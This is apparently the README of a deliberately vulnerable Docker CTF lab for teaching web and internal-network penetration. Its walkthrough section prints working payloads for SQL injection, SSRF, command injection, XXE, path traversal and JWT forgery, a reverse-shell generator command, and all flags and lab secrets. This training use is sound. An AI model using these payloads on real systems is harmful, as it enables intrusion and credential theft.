# ☣️ BioHazard CTF Lab — 生化公司内网渗透实训靶场

> 🕵️ 剧情：你是一名白帽雇佣兵，接悬赏入侵"生化公司"内网。
> 🎯 目标：从 Web 入口一路打通到内网域控，收集全部 8 面 flag。
> 🎮 玩法：**刷着玩** —— 自带可视化攻防教学面板，边打边学。

![CI](https://github.com/lilili9646464/biohazard-ctf/actions/workflows/ci.yml/badge.svg)
![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green)
![Docker](https://img.shields.io/badge/Docker-compose-2496ED?logo=docker&logoColor=white)

---

## ✨ v2 新特性

| 特性 | 说明 |
|---|---|
| 🎓 **可视化教学面板** | 访问 `/lab`：SVG 攻击链图谱 + 11 关卡卡片 + 进度实时追踪 + 一键复制攻击命令 |
| 🚩 **8 面 flag / 11 个关卡** | 从信息收集 → RCE → 域控沦陷，覆盖 11 种经典漏洞类型 |
| ⚙️ **CI 自动测试** | GitHub Actions 每次推送自动跑全链路攻击测试（18 项断言） |
| 🐳 **一条命令部署** | `docker compose up` 起 4 台内网机器，体验真实横向渗透 |
| 🧭 **进度追踪系统** | 服务端记录你的攻击进度，刷新面板实时点亮攻击链 |

---

## 🗺️ 靶场架构

```
宿主机 (你的电脑)
└── 内网 172.20.0.0/24 (docker bridge)
    ├── web    (172.20.0.10 :80)  ←── 唯一暴露的入口 (11种Web漏洞 + /lab教学面板)
    ├── mysql  (172.20.0.20 :3306)  ← 数据库 (flag#2)
    ├── backup (172.20.0.30 :8080)  ← 内网备份 (flag#3 + 域控凭据)
    └── dc     (172.20.0.40 :389)   ← 域控 (flag#4)
```

> 💡 **设计巧思**：mysql/backup/dc **都不暴露端口**给宿主机。想拿 flag#3/#4 必须利用 web 的 SSRF 漏洞当"跳板"进入内网——这正是真实内网渗透的典型打法。

---

## 🎯 关卡一览（11 关 · 8 面 flag）

| 关卡 | 漏洞类型 | Flag | 端点 |
|---|---|---|---|
| S1 | 调试接口信息泄露 | 🏁 flag#1 | `/debug_info` |
| S2 | SQL 注入绕过登录 | 🏁 flag#2 | `/login` → `/admin` |
| S3 | 源码泄露（硬编码密钥） | — | `/source` `/api/routes` |
| S4 | SSRF 访问内网 | 🏁 flag#3 | `/api/fetch` |
| S5 | 命令注入 | — | `/api/ping` |
| S6 | pickle 反序列化 RCE | — | `/api/deserialize` |
| S7 | 内网横向移动 → 域控 | 🏁 flag#4 | `/api/fetch → dc` |
| S8 | 任意文件上传 + 目录浏览 | 🏁 flag#5 | `/api/upload` `/uploads/` |
| S9 | XXE 外部实体注入 | 🏁 flag#6 | `/api/parse_xml` |
| S10 | JWT 弱密钥伪造 | 🏁 flag#7 | `/api/jwt/*` |
| S11 | 目录穿越 | 🏁 flag#8 | `/api/download` |

---

## 🚀 快速开始

**前置要求**：Docker + Docker Compose（`docker compose version` 验证）

```bash
git clone https://github.com/lilili9646464/biohazard-ctf.git
cd biohazard-ctf
docker compose up -d --build    # 一键启动
```

打开浏览器：

- 🎮 **http://localhost/lab** —— 教学面板（推荐从这里开始！）
- 🎯 **http://localhost** —— 直接进靶场

**重置**：`docker compose down -v && docker compose up -d --build`

---

## 🧪 开发者模式（无 Docker 快速迭代）

```bash
pip install flask requests lxml
# 本地跑测试（单进程内起全部服务，18 项断言）
python3 scripts/test_all.py
# 本地起 web 靶机 (SQLite 模式, 端口 5000)
PORT=5000 python3 web/app.py
# 一键通关演示 (curl 打全程)
DC_PORT=1389 bash scripts/attacker.sh http://127.0.0.1:5000
```

---

## 📦 目录结构

```
biohazard-ctf/
├── .github/workflows/ci.yml  # CI: 推送自动跑攻击链测试
├── docker-compose.yml        # 四服务编排 (web/mysql/backup/dc)
├── web/
│   ├── app.py                # 漏洞主应用 (11种漏洞 + 进度追踪)
│   ├── lab.html              # 🎓 可视化教学面板 (SVG图谱+交互)
│   ├── Dockerfile
│   └── requirements.txt
├── mysql/init.sql            # 建库 + flag#2 + 弱口令账号
├── backup/                   # 内网备份服务 (flag#3 + 域控凭据)
├── dc/                       # 模拟域控 (flag#4)
├── scripts/
│   ├── attacker.sh           # 一键通关演示脚本 (11关全演示)
│   ├── test_all.py           # 集成测试 (18项断言)
│   └── solvers/gen_pickle.py # pickle RCE payload 生成器
└── flags/flags.txt           # 通关答案 (别偷看!)
```

---

## 📖 通关攻略（卡住了再看）

<details>
<summary><b>S1 信息收集</b></summary>

```bash
nmap -sS -p- <靶机IP>                    # 只有80开放
dirsearch -u http://<靶机IP>             # 发现 robots.txt / login / debug_info
curl http://<靶机IP>/debug_info          # 🏁 flag#1 + MySQL地址 + 内网网段
```
</details>

<details>
<summary><b>S2 SQL 注入</b></summary>

```bash
curl -c c.txt -X POST -d "username=' OR '1'='1' -- &password=x" http://<靶机IP>/login
curl -b c.txt http://<靶机IP>/admin      # 🏁 flag#2
# 弱口令: admin / admin@123 也可以直接登录
```
</details>

<details>
<summary><b>S3 源码泄露 → 伪造 cookie</b></summary>

```bash
curl http://<靶机IP>/source | grep SECRET_KEY   # 找到 Th1s_1s_N0t_Th3_Rea1_K3y
curl http://<靶机IP>/api/routes                  # 枚举隐藏路由
# 用 flask-unsign 伪造 {"role":"admin"} 的 session cookie
flask-unsign --sign --cookie "{'role':'admin'}" --secret "Th1s_1s_N0t_Th3_Rea1_K3y"
```
</details>

<details>
<summary><b>S4 SSRF 打内网</b></summary>

```bash
curl "http://<靶机IP>/api/fetch?url=http://backup:8080/"
curl "http://<靶机IP>/api/fetch?url=http://backup:8080/archives/core_backup.txt"   # 🏁 flag#3
curl "http://<靶机IP>/api/fetch?url=http://backup:8080/secrets/dc_creds.txt"       # 🔑 域控凭据
```
</details>

<details>
<summary><b>S5 命令注入 / S6 pickle RCE</b></summary>

```bash
curl "http://<靶机IP>/api/ping?ip=127.0.0.1;id"     # uid= 即注入成功
python3 scripts/solvers/gen_pickle.py --reverse <你的IP> 4444   # 生成反弹shell payload
```
</details>

<details>
<summary><b>S7 域控横向移动</b></summary>

```bash
curl "http://<靶机IP>/api/fetch?url=http://dc:389/auth?user=svc_dc&pass=S3rv1c3_P@ss!_2026"
# 🏁 flag#4
```
</details>

<details>
<summary><b>S8 任意文件上传</b></summary>

```bash
echo x > /tmp/x.txt
curl -F "file=@/tmp/x.txt" http://<靶机IP>/api/upload     # 上传不校验
curl http://<靶机IP>/uploads/                              # 目录浏览 → 发现 flag5_upload.txt
curl http://<靶机IP>/uploads/flag5_upload.txt              # 🏁 flag#5
```
</details>

<details>
<summary><b>S9 XXE</b></summary>

```bash
curl -d 'xml=<!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/flag6_xxe.txt">]><r><name>&x;</name></r>' \
  http://<靶机IP>/api/parse_xml                            # 🏁 flag#6
```
</details>

<details>
<summary><b>S10 JWT 伪造</b></summary>

```bash
# 拿令牌 → 解码 → 改 role=admin → 用弱密钥 super_secret_key_123 重签 → 访问
curl http://<靶机IP>/api/jwt/token         # 得到 JWT
# 解码中间段改 role: admin, 用密钥重签 HS256
curl -H "Authorization: Bearer <伪造token>" http://<靶机IP>/api/jwt/data   # 🏁 flag#7
```
</details>

<details>
<summary><b>S11 目录穿越</b></summary>

```bash
curl "http://<靶机IP>/api/download?file=../../flag8_traversal.txt"   # 🏁 flag#8
curl "http://<靶机IP>/api/download?file=../../../../etc/passwd"      # 任意读取
```
</details>

---

## 🏁 Flag 一览

```
flag#1  flag{0pen_D3bug_1s_D4ng3r0us}
flag#2  flag{C0ngr4ts_Y0u_R34d_DB}
flag#3  flag{B4ckup_0f_Th3_Und3ad}
flag#4  flag{D0m41n_C0ntr0ll3r_0wn3d}
flag#5  flag{Unr3str1ct3d_Upl04d}
flag#6  flag{Xx3_1s_D4ng3r0us}
flag#7  flag{Jwt_S3cr3t_T00_W34k}
flag#8  flag{Tr4v3rs4l_K1ll5_T4rget}
```

---

## 🗓️ 路线图

- [x] v1.0 基础 7 关攻击链（2026-08）
- [x] v2.0 十一关卡 + 可视化教学面板 + CI + 8 flag（2026-08）
- [ ] v3.0 多剧情模式（生化公司 → 银行 → 军工）
- [ ] v3.0 计分板 + 排行榜
- [ ] v3.0 在线解析版（不用 Docker 也能玩）

---

## ⚠️ 安全声明

- 本靶场**只允许在本地/Docker 隔离环境中运行**，请勿部署到公网
- 所有 flag 与漏洞均为虚构场景；**未授权对真实系统进行渗透测试属违法行为**
- 本项目仅供网络安全教学与研究使用

---

## 📄 License

MIT © lilili9646464 — 自由使用、修改、教学。点个 ⭐ 是对作者最大的鼓励！